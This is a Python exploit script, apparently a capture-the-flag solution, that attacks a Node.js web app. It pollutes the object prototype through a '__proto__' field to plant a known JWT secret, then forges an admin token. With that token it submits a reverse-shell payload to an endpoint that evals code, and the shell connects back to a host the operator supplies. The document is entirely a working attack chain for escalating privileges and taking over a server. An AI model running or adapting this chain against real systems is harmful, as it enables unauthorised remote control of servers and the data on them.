import requests
import jwt

URL = "http://faast.hkn"
SECRET = "psyduck"

print("Registering...")
r = requests.post(f"{URL}/register", json={"username": "test", "password": "test"})
print(r.json())
print()

print("Logging in...")
r = requests.post(f"{URL}/login", json={"username": "test", "password": "test"})
print(r.json())
token = r.json()["msg"]
decoded_token = jwt.decode(token, options={"verify_signature": False})
print(f"Token: {token}")
print(f"Decoded: {decoded_token}\n")

print("Updating user (prototype pollution point)...")
r = requests.post(f"{URL}/update", json={ "name": "Psyduck", "__proto__": { "secret": SECRET } }, headers={ "x-auth-token": token })
print(r.json())
print()

# Update token and re-sign with cursomt secret
decoded_token["username"] = "admin"
new_token = jwt.encode(decoded_token, SECRET, algorithm="HS256")

revshell = f"""
(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect({input("Port: ")}, "{input("Host: ")}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/; // Prevents the Node.js application from crashing
}})();
"""

print("Sending revshell as code to run at server (eval'ed by admin)...")
r = requests.post(f"{URL}/run", json={"code": revshell }, headers={ "x-auth-token": new_token })
print(r.json())
print()
